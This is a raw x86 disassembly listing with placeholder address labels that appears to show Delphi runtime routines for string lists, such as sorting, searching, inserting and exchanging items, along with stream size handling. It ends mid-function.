mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40442c
call sub_408564
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4145dc
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_4145e4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_404004
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_40405c
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4146f6
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f90
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40422c
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_40422c
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40422c
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_40422c
mov ebx eax
test ebx ebx
je r-xdata
sub_41470c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41478b
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_414798
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_40448c
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_414df8
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404154
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40bf7c
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414862
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_41486c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_4148a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4148d0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415934
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41491f
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_414924
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414290
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415480
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_40405c
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4149ab
mov eax [ ebp - 0x4 ]
call sub_41434c
retn
sub_4149d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a78
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
call sub_414290
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41434c
retn
sub_414a80
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414ab8
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417670
mov eax [ ebp - 0x4 ]
call sub_414290
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41670c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418310
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b3e
mov eax [ ebp - 0x4 ]
call sub_41434c
retn
sub_414b68
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415934
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bba
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_414bc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40422c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4156e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c14
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_414c20
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4055c0
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_414c54
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404164
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c9e
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_414ca4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414290
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d42
mov eax [ ebp - 0x4 ]
call sub_41434c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40405c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_414d68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_418ebc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_418ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414de5
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418f64
inc esi
dec ebx
jne r-xdata
sub_414e10
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_414e2c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4140c8
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4049e8
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_414e94
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414444
jmp r-xdata
sub_414f30
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_4049e8
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_414f70
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414444
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404ad4
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_414fdc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414444
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_414444
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_415038
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415038
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41505c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_4150d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414444
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403fc0
pop edi
pop esi
pop ebx
retn
sub_415110
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414444
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_415138
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41516c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41470c
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4151b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414444
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414444
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41520c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_415138
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403fc0
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028b8
sub_415284
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414444
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414444
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403fc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4152e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414444
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415320
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_415038
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415320
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4153d0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41542c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_415320
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415480
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_4154b4
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_415518
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41556c
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403184
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
mov esp ebp
pop ebp
retn
sub_4155b8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_40317c
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41556c
pop ecx
mov eax [ ebx ]
call sub_4031c0
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41556c
pop ecx
sub_41563c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
